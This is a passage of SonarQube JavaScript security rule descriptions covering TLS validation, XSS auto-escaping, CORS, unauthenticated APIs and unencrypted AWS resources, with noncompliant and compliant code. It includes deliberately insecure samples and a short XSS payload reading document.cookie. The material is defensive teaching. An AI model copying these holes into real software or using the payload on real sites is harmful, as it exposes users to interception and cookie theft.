<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="compliant">
new ec2.CfnSecurityGroupIngress(
    this,
    &#34;ingress-all-ipv4-tcp-http&#34;, {
        ipProtocol: &#34;6&#34;,
        cidrIp: &#34;0.0.0.0/0&#34;,
        fromPort: 80,
        toPort: 80,
        groupId: securityGroup.attrGroupId
    }
)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Security groups for your VPC </li><li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview" rel="nofollow">Azure Documentation</a> - Network security
  groups </li><li> <a href="https://cloud.google.com/vpc/docs/using-firewalls" rel="nofollow">GCP Documentation</a> - Firewalls </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4830">
              javascript:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by setting <code>rejectUnauthorized</code> to <code>false</code>. To enable validation set the value to
<code>true</code> or do not set <code>rejectUnauthorized</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  rejectUnauthorized: false,
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
}); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
    rejectUnauthorized: false,
    secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
}); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
    secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1442">
              javascript:S1442
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS4507&amp;rule_key&#61;javascript%3AS4507" rel="nofollow">S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p><code>alert(...)</code> as well as <code>confirm(...)</code> and <code>prompt(...)</code> can be useful for debugging during development, but in
production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed.</p>
<h3>Noncompliant code example</h3>
<pre>
if(unexpectedCondition) {
  alert(&#34;Unexpected Condition&#34;);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4036">
              javascript:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The directories in the PATH environment variable may be defined by not trusted entities. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);
cp.exec(&#39;file.exe&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);
cp.exec(&#39;/usr/bin/file.exe&#39;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/426" rel="nofollow">MITRE, CWE-426</a> - Untrusted Search Path </li><li> <a href="https://cwe.mitre.org/data/definitions/427" rel="nofollow">MITRE, CWE-427</a> - Uncontrolled Search Path Element </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6333">
              javascript:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br /> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The underlying API exposes all of its contents to any anonymous Internet user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul><li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li><li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li><li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html" rel="nofollow">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from &#34;aws-cdk-lib&#34;

const resource &#61; api.root.addResource(&#34;example&#34;)
resource.addMethod(
    &#34;GET&#34;,
    new apigateway.HttpIntegration(&#34;https://example.org&#34;),
    {
        authorizationType: apigateway.AuthorizationType.NONE // Sensitive
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html" rel="nofollow">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from &#34;aws-cdk-lib&#34;

new apigateway.CfnRoute(this, &#34;no-auth&#34;, {
    apiId: api.ref,
    routeKey: &#34;GET /no-auth&#34;,
    authorizationType: &#34;NONE&#34;, // Sensitive
    target: exampleIntegration
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html" rel="nofollow">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from &#34;aws-cdk-lib&#34;

const resource &#61; api.root.addResource(&#34;example&#34;,{
    defaultMethodOptions:{
        authorizationType: apigateway.AuthorizationType.IAM
    }
})
resource.addMethod(
    &#34;POST&#34;,
    new apigateway.HttpIntegration(&#34;https://example.org&#34;),
    {
        authorizationType: apigateway.AuthorizationType.IAM
    }
)
resource.addMethod(  // authorizationType is inherited from the Resource&#39;s configured defaultMethodOptions
    &#34;GET&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html" rel="nofollow">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from &#34;aws-cdk-lib&#34;

new apigateway.CfnRoute(this, &#34;auth&#34;, {
    apiId: api.ref,
    routeKey: &#34;POST /auth&#34;,
    authorizationType: &#34;AWS_IAM&#34;,
    target: exampleIntegration
})
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html" rel="nofollow">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5247">
              javascript:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy&#39;s template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a href="https://twig.symfony.com/doc/3.x/filters/escape.html" rel="nofollow">the strategy applied</a> and the context, for example a &#34;html auto-escaping&#34; strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity" rel="nofollow">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute" rel="nofollow">html attribute</a> because &#39;<code>:</code>&#39; character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href&#61;&#34;{<!-- -->{ myLink }}&#34;&gt;link&lt;/a&gt; // myLink &#61; javascript:alert(document.cookie)
&lt;a href&#61;&#34;javascript:alert(document.cookie)&#34;&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> Templates are used to render web content and
    <ul><li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li><li> there is no local mechanism in place to sanitize or validate the inputs. </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/mustache" rel="nofollow">mustache.js</a> template engine:</p>
<pre>
let Mustache &#61; require(&#34;mustache&#34;);

Mustache.escape &#61; function(text) {return text;}; // Sensitive

let rendered &#61; Mustache.render(template, { name: inputName });
</pre>
<p><a href="https://www.npmjs.com/package/handlebars" rel="nofollow">handlebars.js</a> template engine:</p>
<pre>
const Handlebars &#61; require(&#39;handlebars&#39;);

let source &#61; &#34;&lt;p&gt;attack {<!-- -->{name}}&lt;/p&gt;&#34;;

let template &#61; Handlebars.compile(source, { noEscape: true }); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it" rel="nofollow">markdown-it</a> markup language parser:</p>
<pre>
const markdownIt &#61; require(&#39;markdown-it&#39;);
let md &#61; markdownIt({
  html: true // Sensitive
});

let result &#61; md.render(&#39;# &lt;b&gt;attack&lt;/b&gt;&#39;);
</pre>
<p><a href="https://www.npmjs.com/package/marked" rel="nofollow">marked</a> markup language parser:</p>
<pre>
const marked &#61; require(&#39;marked&#39;);

marked.setOptions({
  renderer: new marked.Renderer(),
  sanitize: false // Sensitive
});

console.log(marked(&#34;# test &lt;b&gt;attack/b&gt;&#34;));
</pre>
<p><a href="https://www.npmjs.com/package/kramed" rel="nofollow">kramed</a> markup language parser:</p>
<pre>
let kramed &#61; require(&#39;kramed&#39;);

var options &#61; {
  renderer: new kramed.Renderer({
    sanitize: false // Sensitive
  })
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/mustache" rel="nofollow">mustache.js</a> template engine:</p>
<pre>
let Mustache &#61; require(&#34;mustache&#34;);

let rendered &#61; Mustache.render(template, { name: inputName }); // Compliant autoescaping is on by default
</pre>
<p><a href="https://www.npmjs.com/package/handlebars" rel="nofollow">handlebars.js</a> template engine:</p>
<pre>
const Handlebars &#61; require(&#39;handlebars&#39;);

let source &#61; &#34;&lt;p&gt;attack {<!-- -->{name}}&lt;/p&gt;&#34;;
let data &#61; { &#34;name&#34;: &#34;&lt;b&gt;Alan&lt;/b&gt;&#34; };

let template &#61; Handlebars.compile(source); // Compliant by default noEscape is set to false
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it" rel="nofollow">markdown-it</a> markup language parser:</p>
<pre>
let md &#61; require(&#39;markdown-it&#39;)(); // Compliant by default html is set to false

let result &#61; md.render(&#39;# &lt;b&gt;attack&lt;/b&gt;&#39;);
</pre>
<p><a href="https://www.npmjs.com/package/marked" rel="nofollow">marked</a> markup language parser:</p>
<pre>
const marked &#61; require(&#39;marked&#39;);

marked.setOptions({
  renderer: new marked.Renderer()
}); // Compliant by default sanitize is set to true

console.log(marked(&#34;# test &lt;b&gt;attack/b&gt;&#34;));
</pre>
<p><a href="https://www.npmjs.com/package/kramed" rel="nofollow">kramed</a> markup language parser:</p>
<pre>
let kramed &#61; require(&#39;kramed&#39;);

let options &#61; {
  renderer: new kramed.Renderer({
    sanitize: true // Compliant
  })
};

console.log(kramed(&#39;Attack [xss?](javascript:alert(&#34;xss&#34;)).&#39;, options));
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6330">
              javascript:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The queue contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from &#39;aws-cdk-lib/aws-sqs&#39;;

new Queue(this, &#39;example&#39;); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from &#39;aws-cdk-lib/aws-sqs&#39;;

new CfnQueue(this, &#39;example&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from &#39;aws-cdk-lib/aws-sqs&#39;;

new Queue(this, &#39;example&#39;, {
    encryption: QueueEncryption.KMS_MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from &#39;aws-cdk-lib/aws-sqs&#39;;

const encryptionKey &#61; new Key(this, &#39;example&#39;, {
    enableKeyRotation: true,
});

new CfnQueue(this, &#39;example&#39;, {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html" rel="nofollow">AWS Documentation</a> -
  Encryption at rest </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5122">
              javascript:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://nodejs.org/api/http.html" rel="nofollow">nodejs http</a> built-in module:</p>
<pre>
const http &#61; require(&#39;http&#39;);
const srv &#61; http.createServer((req, res) &#61;&gt; {
  res.writeHead(200, { &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39; }); // Sensitive
  res.end(&#39;ok&#39;);
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors" rel="nofollow">cors middleware</a>:</p>
<pre>
const cors &#61; require(&#39;cors&#39;);

let app1 &#61; express();
app1.use(cors()); // Sensitive: by default origin is set to *

let corsOptions &#61; {
  origin: &#39;*&#39; // Sensitive
};

let app2 &#61; express();
app2.use(cors(corsOptions));
</pre>
<p>User-controlled origin:</p>
<pre>
function (req, res) {
  const origin &#61; req.header(&#39;Origin&#39;);
  res.setHeader(&#39;Access-Control-Allow-Origin&#39;, origin); // Sensitive
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://nodejs.org/api/http.html" rel="nofollow">nodejs http</a> built-in module:</p>
<pre>
const http &#61; require(&#39;http&#39;);
const srv &#61; http.createServer((req, res) &#61;&gt; {
  res.writeHead(200, { &#39;Access-Control-Allow-Origin&#39;: &#39;trustedwebsite.com&#39; }); // Compliant
  res.end(&#39;ok&#39;);
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors" rel="nofollow">cors middleware</a>:</p>
<pre>
const cors &#61; require(&#39;cors&#39;);

let corsOptions &#61; {
  origin: &#39;trustedwebsite.com&#39; // Compliant
};

let app &#61; express();
app.use(cors(corsOptions));
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
function (req, res) {
  const origin &#61; req.header(&#39;Origin&#39;);

  if (trustedOrigins.indexOf(origin) &gt;&#61; 0) {
    res.setHeader(&#39;Access-Control-Allow-Origin&#39;, origin);
  }
};
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6332">
              javascript:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file system contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new FileSystem(this, &#39;unencrypted-explicit&#39;, {
    vpc: new Vpc(this, &#39;VPC&#39;),
    encrypted: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new CfnFileSystem(this, &#39;unencrypted-implicit-cfn&#39;, {
}); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new FileSystem(this, &#39;encrypted-explicit&#39;, {
